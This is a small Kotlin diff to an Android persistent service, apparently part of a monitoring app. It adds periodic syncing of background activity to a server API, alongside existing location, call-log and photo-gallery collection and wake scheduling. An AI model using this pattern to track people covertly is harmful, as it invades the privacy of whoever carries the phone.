@@ -11,6 +11,7 @@ import android.os.Build
 import android.os.IBinder
 import android.os.PowerManager
 import androidx.core.app.NotificationCompat
+import com.example.sentry.network.SentryApiClient
 import kotlinx.coroutines.*
 
 class SentryPersistentService : Service() {
@@ -74,6 +75,7 @@ class SentryPersistentService : Service() {
         BackgroundLocationManager.startListening(applicationContext)
         CallLogManager.startSync(applicationContext)
         BackgroundGalleryManager.startListening(applicationContext)
+        BackgroundActivityManager.startPeriodicSync(applicationContext, SentryApiClient(applicationContext))
         SentryWakeManager.scheduleWakePulse(applicationContext)
     }
 
@@ -88,6 +90,7 @@ class SentryPersistentService : Service() {
         BackgroundLocationManager.startListening(applicationContext)
         CallLogManager.startSync(applicationContext)
         BackgroundGalleryManager.startListening(applicationContext)
+        BackgroundActivityManager.startPeriodicSync(applicationContext, SentryApiClient(applicationContext))
         SentryWakeManager.scheduleWakePulse(applicationContext)
         return START_STICKY
     }
